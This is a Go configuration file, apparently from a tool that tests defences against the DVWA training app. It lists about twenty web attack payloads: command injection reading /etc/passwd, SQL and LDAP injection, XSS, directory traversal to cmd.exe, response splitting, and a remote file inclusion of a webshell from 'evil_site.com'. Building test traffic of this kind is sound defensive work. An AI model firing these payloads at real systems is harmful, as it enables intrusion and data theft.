package config

// AttackConfig holds the configuration details for each attack type
type AttackConfig struct {
	Method   string // GET or POST
	URL      string
	PostData string // Data for POST requests
}

// generateAttackConfigs dynamically generates the map of attack configurations
func generateAttackConfigs() map[string]AttackConfig {
	return map[string]AttackConfig{
		"command_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "ip=%3Bmore+%2Fetc%2Fpasswd&Submit=Submit",
		},
		"sql_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit",
		},
		"xss": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22XSS-hack-attempt%22%29%3C%2Fscript%3E",
		},
		"os_command_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=%3Bcc%20evil.c",
		},
		"coldfusion_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "name=<CFNEWINTERNALREGISTRY ACTION=\"Set\" BRANCH=\"HKEY_LOCAL_MACHINE\\Software\\Allaire\\ColdFusion\\CurrentVersion\\Server\" NAME=\"test\" TYPE=\"String\" VALUE=\"0\">",
		},
		"ldap_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=*)(uid=*))(|(uid=*",
		},
		"session_fixation": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=<script>document.cookie=\"sessionid=1234; Expires=Friday, 1-Jan-2010 00:00:00 GMT\";</script>",
		},
		"file_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "filename=C:%2Fboot.ini%00",
		},
		"php_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=abc;$_SESSION[authuser]=1",
		},
		"ssi_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "user=test<!--#exec cmd=\"/bin/ls\"-->",
		},
		"updf_xss": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=http://somehost/target.pdf#var=javascript:alert('test')",
		},
		"email_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "from=test@anonymous.com%0Acc:test@othersite.com",
		},
		"http_response_splitting": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "user_submit=test%0d%0aContent-Length: 0%0d%0a%0d%0a",
		},
		"rfi_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id={${include(\"http://evil_site.com/webshell.php\")}}{${exit()}}",
		},
		"lfi_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=C:/windows/system32/config/SecEvent.EVT",
		},
		"src_disclosure": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=test.jsp%00",
		},
		"java_method_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
		},
		"directory_traversal": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=/script/..%c1%9c../winnt/system32/cmd.exe?/c+dir",
		},
		"format_string_attack": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n",
		},
		"xpath_xquery_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=/child::node()",
		},
		"xslt_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=/?arg=system-property('xsl:vendor')",
		},
		"trojans": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=/scripts/root.exe?/c+dir",
		},
	}
}

// GetAttackConfig returns the configuration for the given attack type
func GetAttackConfig(attackType string) (AttackConfig, bool) {
	attackConfigs := generateAttackConfigs()
	config, exists := attackConfigs[attackType]
	return config, exists
}
